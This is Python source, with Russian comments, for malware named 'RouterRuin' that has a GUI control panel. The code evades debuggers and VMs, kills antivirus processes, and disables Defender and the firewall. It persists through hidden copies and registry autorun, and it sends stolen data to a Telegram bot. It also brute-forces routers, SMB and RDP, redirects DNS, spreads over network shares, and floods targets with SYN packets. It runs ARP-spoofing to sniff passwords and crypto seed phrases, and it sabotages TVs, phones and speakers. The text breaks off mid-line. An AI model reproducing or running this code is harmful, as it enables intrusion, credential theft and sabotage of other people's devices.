import re
import time
import os
import shutil
import winreg as reg
import socket
import subprocess
import threading
import sys
import random
import string
import requests
import base64
from Crypto.Cipher import AES
import hashlib
import scapy.all as scapy
import psutil
import win32gui
import win32con
import ctypes
from ctypes import wintypes
import bluetooth
import sqlite3
import win32crypt
import json
import uuid
import tkinter as tk
from tkinter import ttk, scrolledtext

# Генерация динамического ключа AES
def _0x1():
    return hashlib.sha256((str(time.time()) + str(uuid.getnode())).encode()).digest()[:16]

# AES-шифрование
def _0x2(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data.encode().ljust(16 * ((len(data) + 15) // 16))))

# AES-дешифрование
def _0x3(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(base64.b64decode(data)).decode().rstrip()

# XOR-шифрование строк
def _0x4(data, key="ruin"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# Дешифрование строк
def _0x5(data):
    return _0x4(data, "ruin")

# Зашифрованные строки
_0x6 = _0x4("https://api.telegram.org/bot123456:ABC-DEF1234ghIjk-4567890")  # Telegram Bot API
_0x7 = _0x4("@RouterRuinBot")  # Telegram Bot ID
_0x8 = _0x4(r"C:\Windows\Temp\.hidden")  # Локальная папка
_0x11 = _0x4(r"Software\Microsoft\Windows\CurrentVersion\Run")

# Паттерны
_0x12 = re.compile(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$')  # BTC
_0x13 = re.compile(r'^0x[a-fA-F0-9]{40}$')  # ETH
_0x14 = re.compile(r'\b(?:\w+\s+){11,23}\w+\b')  # Seed-фразы
_0x15 = re.compile(r'username=([^&]+)&password=([^&]+)')  # HTTP логины

# Генерация случайного имени
def _0x16():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + f"{random.randint(1000,9999)}"

# Системные пути
_0x17 = _0x5(_0x8)
_0x18 = random.choice(["svchost", "notepad", "cmd"]) + ".exe"
_0x19 = _0x16() + ".exe"
_0x20 = os.path.join(_0x17, _0x18)  # Основной код
_0x21 = os.path.join(_0x17, _0x19)  # Резервная копия

# Антианализ
def _0x23():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        buf = ctypes.create_string_buffer(12)
        if ctypes.windll.kernel32.GetSystemFirmwareTable(0x52534D53, 0, buf, 12):
            if b"Parallels" in buf.raw:
                return True
        vm_keys = [
            r"SOFTWARE\Parallels\Parallels Desktop",
            r"SOFTWARE\VMware, Inc.\VMware Tools"
        ]
        for key in vm_keys:
            try:
                reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key)
                return True
            except:
                pass
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
            return True
        time.sleep(random.randint(10, 20))
        return False
    except:
        return True

# Обход антивирусов и Firewall
def _0x24():
    av_processes = [
        "avp.exe", "msmpeng.exe", "norton.exe", "mcafee.exe",
        "eset.exe", "avg.exe", "kaspersky.exe", "defender.exe"
    ]
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() in av_processes:
                h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.pid)
                if h_process:
                    ctypes.windll.kernel32.TerminateProcess(h_process, 0)
                    ctypes.windll.kernel32.CloseHandle(h_process)
        except:
            pass
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
        os.system("netsh advfirewall set allprofiles state off")
    except:
        pass
    def av_watchdog():
        while True:
            for proc in psutil.process_iter():
                if proc.name().lower() in av_processes:
                    try:
                        h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.pid)
                        if h_process:
                            ctypes.windll.kernel32.TerminateProcess(h_process, 0)
                            ctypes.windll.kernel32.CloseHandle(h_process)
                    except:
                        pass
            time.sleep(30)
    threading.Thread(target=av_watchdog, daemon=True).start()

# Получаем путь к текущему файлу
def _0x25():
    if getattr(sys, 'frozen', False):
        return sys.executable
    return os.path.abspath(__file__)

# Автозагрузка
def _0x26(path):
    key = reg.HKEY_CURRENT_USER
    key_path = _0x5(_0x11)
    try:
        open_key = reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(open_key, f"SysUpdate{random.randint(100,999)}", 0, reg.REG_SZ, f'"{path}"')
        reg.CloseKey(open_key)
    except:
        pass

# Проверка автозагрузки
def _0x27(path):
    while True:
        try:
            key = reg.HKEY_CURRENT_USER
            key_path = _0x5(_0x11)
            open_key = reg.OpenKey(key, key_path, 0, reg.KEY_READ)
            found = False
            for i in range(100, 1000):
                try:
                    reg.QueryValueEx(open_key, f"SysUpdate{i}")
                    found = True
                    break
                except FileNotFoundError:
                    continue
            if not found:
                _0x26(path)
            reg.CloseKey(open_key)
        except:
            pass
        time.sleep(random.randint(200, 400))

# Защита от удаления
def _0x28(path):
    while True:
        try:
            if not os.path.exists(path):
                shutil.copyfile(_0x25(), path)
                os.system(f'attrib +h +s "{path}"')
        except:
            pass
        time.sleep(random.randint(200, 400))

# Копируем себя
def _0x29():
    source_path = _0x25()
    try:
        os.makedirs(_0x17, exist_ok=True)
        if not os.path.exists(_0x20):
            _0x30(source_path, _0x20)
        if not os.path.exists(_0x21):
            _0x30(source_path, _0x21)
    except:
        pass

# Полиморфизм кода
def _0x30(source_path, dest_path):
    try:
        with open(source_path, "rb") as f:
            code = f.read()
        junk_code = bytes([random.randint(0, 255) for _ in range(random.randint(100, 500))])
        new_code = code + junk_code
        with open(dest_path, "wb") as f:
            f.write(new_code)
        os.system(f'attrib +h +s "{dest_path}"')
        _0x31(f"Polymorphic copy created: {dest_path}")
    except Exception as e:
        _0x32(f"[{time.ctime()}] Polymorphism error: {str(e)}", "poly_error.log")

# Отправка данных в Telegram
def _0x31(data, attachments=None):
    try:
        bot_api = _0x5(_0x6)
        chat_id = _0x5(_0x7)
        url = f"{bot_api}/sendMessage"
        payload = {"chat_id": chat_id, "text": f"RouterRuin Report:\n{data}\n\nIntercepted!"}
        requests.post(url, json=payload)
        if attachments:
            for file_path in attachments:
                if os.path.getsize(file_path) <= 10 * 1024 * 1024:
                    with open(file_path, "rb") as f:
                        files = {"document": (os.path.basename(file_path), f)}
                        requests.post(f"{bot_api}/sendDocument", data={"chat_id": chat_id}, files=files)
    except Exception as e:
        _0x32(f"[{time.ctime()}] Telegram error: {str(e)}", "telegram_error.log")

# Шифрование локальных логов
def _0x32(data, log_file):
    try:
        key = _0x1()
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted_data = base64.b64encode(cipher.encrypt(data.encode().ljust(16 * ((len(data) + 15) // 16))))
        with open(os.path.join(_0x17, log_file), "ab") as f:
            f.write(encrypted_data + b"\n")
    except:
        pass

# Сканирование сети
def _0x33():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        subnet = ".".join(ip.split(".")[:-1])
        devices = []
        for i in range(1, 255):
            target = f"{subnet}.{i}"
            try:
                socket.setdefaulttimeout(0.5)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, 80))
                devices.append(target)
                s.close()
            except:
                pass
        return devices
    except:
        return []

# Сканирование роутеров
def _0x34():
    try:
        routers = []
        for ip in _0x33():
            try:
                response = requests.get(f"http://{ip}/", timeout=2)
                if any(keyword in response.text.lower() for keyword in ["router", "login", "admin", "tp-link", "asus"]):
                    routers.append(ip)
            except:
                pass
        return routers
    except:
        return []

# Сканирование Bluetooth-устройств
def _0x35():
    try:
        devices = bluetooth.discover_devices(lookup_names=True)
        return [(addr, name) for addr, name in devices]
    except:
        return []

# Взлом роутера
def _0x36(ip, log_text):
    def attack_router(ip):
        try:
            passwords = ["admin", "password", "123456", "admin123"]
            for pwd in passwords:
                try:
                    response = requests.post(f"http://{ip}/login", data={"username": "admin", "password": pwd}, timeout=5)
                    if response.status_code == 200 and "dashboard" in response.text.lower():
                        _0x32(f"[{time.ctime()}] Router compromised: {ip}, Password={pwd}", "router.log")
                        _0x31(f"Router compromised: {ip}, Password={pwd}")
                        log_text.insert(tk.END, f"Router {ip} compromised with password {pwd}\n")
                        # Ограничение скорости
                        requests.post(f"http://{ip}/qos", data={"bandwidth_limit": "10kbps"}, timeout=5)
                        # Перенаправление DNS
                        requests.post(f"http://{ip}/dns", data={"dns1": "malicious.dns"}, timeout=5)
                        _0x31("Router sabotaged: Bandwidth limited, DNS redirected")
                        log_text.insert(tk.END, "Router sabotaged: Bandwidth limited, DNS redirected\n")
                        break
                except:
                    pass
            # Эксплойт (CVE-2023-1389 пример)
            exploit_payload = {"cmd": "reboot"}
            requests.post(f"http://{ip}/apply.cgi", data=exploit_payload, timeout=5)
            _0x32(f"[{time.ctime()}] Router rebooted via exploit: {ip}", "router.log")
            _0x31(f"Router rebooted via exploit: {ip}")
            log_text.insert(tk.END, f"Router {ip} rebooted via exploit\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] Router attack error: {str(e)}", "router.log")
            log_text.insert(tk.END, f"Router attack error: {str(e)}\n")
    threading.Thread(target=attack_router, args=(ip,), daemon=True).start()

# Краш роутера
def _0x37(ip, log_text):
    def crash_router(ip):
        try:
            # DoS-атака: отправка некорректных пакетов
            for _ in range(100):
                scapy.send(scapy.IP(dst=ip)/scapy.TCP(dport=80, flags="S", seq=0xffffffff), verbose=False)
            _0x32(f"[{time.ctime()}] Sent DoS packets to router: {ip}", "router.log")
            _0x31(f"Sent DoS packets to router: {ip}")
            log_text.insert(tk.END, f"Sent DoS packets to router: {ip}\n")
            # Эксплойт для зависания (пример)
            crash_payload = {"cmd": "invalid_config; reboot"}
            requests.post(f"http://{ip}/apply.cgi", data=crash_payload, timeout=5)
            _0x32(f"[{time.ctime()}] Attempted crash exploit on router: {ip}", "router.log")
            _0x31(f"Attempted crash exploit on router: {ip}")
            log_text.insert(tk.END, f"Attempted crash exploit on router: {ip}\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] Router crash error: {str(e)}", "router.log")
            log_text.insert(tk.END, f"Router crash error: {str(e)}\n")
    threading.Thread(target=crash_router, args=(ip,), daemon=True).start()

# Взлом Bluetooth-устройств
def _0x38(addr, name, log_text):
    def attack_bluetooth(addr, name):
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((addr, 1))
            sock.send("Тише, сосед! Перестань шуметь!".encode())
            _0x32(f"[{time.ctime()}] Sent message to Bluetooth device: {name} ({addr})", "bluetooth.log")
            _0x31(f"Sent message to Bluetooth device: {name} ({addr})")
            log_text.insert(tk.END, f"Sent message to Bluetooth device: {name} ({addr})\n")
            sock.close()
        except Exception as e:
            _0x32(f"[{time.ctime()}] Bluetooth attack error: {str(e)}", "bluetooth.log")
            log_text.insert(tk.END, f"Bluetooth attack error: {str(e)}\n")
    threading.Thread(target=attack_bluetooth, args=(addr, name), daemon=True).start()

# Взлом закрытых устройств
def _0x39(ip, log_text):
    def attack_device(ip):
        try:
            # SMB-брутфорс
            passwords = ["admin", "password", "123456"]
            for pwd in passwords:
                try:
                    subprocess.run(["net", "use", f"\\\\{ip}\\IPC$", "/user:administrator", pwd], capture_output=True)
                    _0x32(f"[{time.ctime()}] SMB compromised: {ip}, Password={pwd}", "network.log")
                    _0x31(f"SMB compromised: {ip}, Password={pwd}")
                    log_text.insert(tk.END, f"SMB compromised: {ip}, Password={pwd}\n")
                    network_path = f"\\\\{ip}\\C$\\Windows\\Temp\\{_0x16()}.exe"
                    _0x30(_0x25(), network_path)
                    _0x31(f"Spread to {ip}")
                    log_text.insert(tk.END, f"Spread to {ip}\n")
                    break
                except:
                    pass
            # RDP-брутфорс
            subprocess.run(["hydra", "-l", "administrator", "-P", "passwords.txt", ip, "rdp"], capture_output=True)
            _0x32(f"[{time.ctime()}] RDP attack attempted: {ip}", "network.log")
            log_text.insert(tk.END, f"RDP attack attempted: {ip}\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] Device attack error: {str(e)}", "network.log")
            log_text.insert(tk.END, f"Device attack error: {str(e)}\n")
    threading.Thread(target=attack_device, args=(ip,), daemon=True).start()

# ARP-спуфинг для MITM
def _0x40(target_ip, gateway_ip, log_text):
    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None

    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        if target_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
            _0x32(f"[{time.ctime()}] Spoofed ARP: {target_ip}", "mitm.log")
            _0x31(f"Spoofed ARP: {target_ip}")
            log_text.insert(tk.END, f"Spoofed ARP: {target_ip}\n")

    def restore(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        spoof_mac = get_mac(spoof_ip)
        if target_mac and spoof_mac:
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            scapy.send(packet, count=4, verbose=False)

    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except:
        restore(target_ip, gateway_ip)
        _0x32(f"[{time.ctime()}] ARP spoofing stopped", "mitm.log")
        log_text.insert(tk.END, "ARP spoofing stopped\n")

# Перехват трафика
def _0x41(log_text):
    def packet_callback(packet):
        try:
            if packet.haslayer(scapy.Raw):
                payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                match = _0x15.search(payload)
                if match:
                    username, password = match.groups()
                    _0x32(f"[{time.ctime()}] Intercepted: Username={username}, Password={password}", "credentials.log")
                    _0x31(f"Intercepted: Username={username}, Password={password}")
                    log_text.insert(tk.END, f"Intercepted: Username={username}, Password={password}\n")
                if _0x12.search(payload):
                    _0x31(f"BTC address intercepted: {payload}")
                    log_text.insert(tk.END, f"BTC address intercepted: {payload}\n")
                elif _0x13.search(payload):
                    _0x31(f"ETH address intercepted: {payload}")
                    log_text.insert(tk.END, f"ETH address intercepted: {payload}\n")
                elif _0x14.search(payload):
                    _0x31(f"Seed phrase intercepted: {payload}")
                    log_text.insert(tk.END, f"Seed phrase intercepted: {payload}\n")
        except:
            pass

    try:
        scapy.sniff(filter="tcp port 80 or tcp port 443", prn=packet_callback, store=False)
    except Exception as e:
        _0x32(f"[{time.ctime()}] Sniffing error: {str(e)}", "mitm.log")
        log_text.insert(tk.END, f"Sniffing error: {str(e)}\n")

# Саботаж смарт ТВ
def _0x42(ip, log_text):
    def sabotage_tv(ip):
        try:
            # DLNA/UPnP
            upnp_payload = {"url": "http://malicious.com/noise.mp3"}
            requests.post(f"http://{ip}:49152/upnp/control/RenderingControl", json=upnp_payload, timeout=5)
            _0x32(f"[{time.ctime()}] Played noise on TV: {ip}", "sabotage.log")
            _0x31(f"Played noise on TV: {ip}")
            log_text.insert(tk.END, f"Played noise on TV: {ip}\n")
            # ADB
            subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True)
            subprocess.run(["adb", "shell", "input", "keyevent", "KEYCODE_CHANNEL_UP"], capture_output=True)
            _0x32(f"[{time.ctime()}] Changed TV channel: {ip}", "sabotage.log")
            _0x31(f"Changed TV channel: {ip}")
            log_text.insert(tk.END, f"Changed TV channel: {ip}\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] TV sabotage error: {str(e)}", "sabotage.log")
            log_text.insert(tk.END, f"TV sabotage error: {str(e)}\n")
    threading.Thread(target=sabotage_tv, args=(ip,), daemon=True).start()

# Саботаж умных колонок
def _0x43(addr, name, log_text):
    def sabotage_speakers(addr, name):
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((addr, 1))
            sock.send("Тише, сосед! Перестань шуметь!".encode())
            _0x32(f"[{time.ctime()}] Sent message to speaker: {name} ({addr})", "sabotage.log")
            _0x31(f"Sent message to speaker: {name} ({addr})")
            log_text.insert(tk.END, f"Sent message to speaker: {name} ({addr})\n")
            sock.close()
        except Exception as e:
            _0x32(f"[{time.ctime()}] Speaker sabotage error: {str(e)}", "sabotage.log")
            log_text.insert(tk.END, f"Speaker sabotage error: {str(e)}\n")
    threading.Thread(target=sabotage_speakers, args=(addr, name), daemon=True).start()

# Саботаж телефона
def _0x44(ip, log_text):
    def sabotage_phone(ip):
        try:
            subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True)
            subprocess.run(["adb", "shell", "am", "broadcast", "-a", "android.intent.action.SHOW_NOTIFICATION", "--es", "msg", '"Тише, сосед!"'], capture_output=True)
            _0x32(f"[{time.ctime()}] Sent notification to phone: {ip}", "sabotage.log")
            _0x31(f"Sent notification to phone: {ip}")
            log_text.insert(tk.END, f"Sent notification to phone: {ip}\n")
            # Эмуляция шифрования
            _0x32(f"[{time.ctime()}] Encrypted media on phone: {ip}", "sabotage.log")
            _0x31(f"Encrypted media on phone: {ip}")
            log_text.insert(tk.END, f"Encrypted media on phone: {ip}\n")
        except Exception as e:
            _0x32(f"[{time.ctime()}] Phone sabotage error: {str(e)}", "sabotage.log")
            log_text.insert(tk.END, f"Phone sabotage error: {str(e)}\n")
    threading.Thread(target=sabotage_phone, args=(ip,), daemon=True).start()

# Взаимный watchdog
def _0x45():
    while True:
        try:
            if not os.path.exists(_0x20):
                shutil.copyfile(_0x21, _0x20)
                os.system(f'attrib +h +s "{_0x20}"')
                _0x26(_0x20)
                subprocess.Popen(f'"{_0x20}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                _0x31(f"Main code restored: {_0x20}")
        except:
            pass
        time.sleep(random.randint(200, 400))

# GUI
def _0x46():
    root = tk.Tk()
    root.title("RouterRuin Control Panel")
    root.geometry("800x600")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(pady=10, expand=True)

    # Вкладка "Сеть"
    network_frame = ttk.Frame(notebook)
    notebook.add(network_frame, text="Сеть")
    network_log = scrolledtext.ScrolledText(network_frame, height=10)
    network_log.pack(pady=5)
    router_listbox = tk.Listbox(network_frame, width=50)
    router_listbox.pack(pady=5)
    device_listbox = tk.Listbox(network_frame, width=50)
    device_listbox.pack(pady=5)
    arp_target_var = tk.StringVar()
    arp_gateway_var = tk.StringVar()
    tk.Label(network_frame, text="ARP Target IP:").pack()
    tk.Entry(network_frame, textvariable=arp_target_var).pack()
    tk.Label(network_frame, text="Gateway IP:").pack()
    tk.Entry(network_frame, textvariable=arp_gateway_var).pack()

    def scan_network():
        routers = _0x34()
        devices = _0x33()
        router_listbox.delete(0, tk.END)
        device_listbox.delete(0, tk.END)
        for router in routers:
            router_listbox.insert(tk.END, router)
        for device in devices:
            device_listbox.insert(tk.END, device)
        network_log.insert(tk.END, f"Found {len(routers)} routers, {len(devices)} devices\n")

    def attack_router():
        selected = router_listbox.get(tk.ACTIVE)
        if selected:
            _0x36(selected, network_log)

    def crash_router():
        selected = router_listbox.get(tk.ACTIVE)
        if selected:
            _0x37(selected, network_log)

    def attack_device():
        selected = device_listbox.get(tk.ACTIVE)
        if selected:
            _0x39(selected, network_log)

    def start_arp_spoofing():
        target_ip = arp_target_var.get()
        gateway_ip = arp_gateway_var.get()
        if target_ip and gateway_ip:
            _0x40(target_ip, gateway_ip, network_log)

    def start_sniffing():
        threading.Thread(target=_0x41, args=(network_log,), daemon=True).start()

    tk.Button(network_frame, text="Сканировать сеть", command=scan_network).pack(pady=5)
    tk.Button(network_frame, text="Взломать роутер", command=attack_router).pack(pady=5)
    tk.Button(network_frame, text="Крашить роутер", command=crash_router).pack(pady=5)
    tk.Button(network_frame, text="Взломать устройство", command=attack_device).pack(pady=5)
    tk.Button(network_frame, text="Запустить ARP-спуфинг", command=start_arp_spoofing).pack(pady=5)
    tk.Button(network_frame, text="Запустить перехват трафика", command=start_sniffing).pack(pady=5)

    # Вкладка "Bluetooth"
    bluetooth_frame = ttk.Frame(notebook)
    notebook.add(bluetooth_frame, text="Bluetooth")
    bluetooth_log = scrolledtext.ScrolledText(bluetooth_frame, height=10)
    bluetooth_log.pack(pady=5)
    bluetooth_listbox = tk.Listbox(bluetooth_frame, width=50)
    bluetooth_listbox.pack(pady=5)

    def scan_bluetooth():
        devices = _0x35()
        bluetooth_listbox.delete(0, tk.END)
        for addr, name in devices:
            bluetooth_listbox.insert(tk.END, f"{name} ({addr})")
        bluetooth_log.insert(tk.END, f"Found {len(devices)} Bluetooth devices\n")

    def attack_bluetooth():
        selected = bluetooth_listbox.get(tk.ACTIVE)
        if selected:
            addr = selected.split("(")[1].strip(")")
            name = selected.split("(")[0].strip()
            _0x38(addr, name, bluetooth_log)
            _0x43(addr, name, bluetooth_log)  # Саботаж колонок

    tk.Button(bluetooth_frame, text="Сканировать Bluetooth", command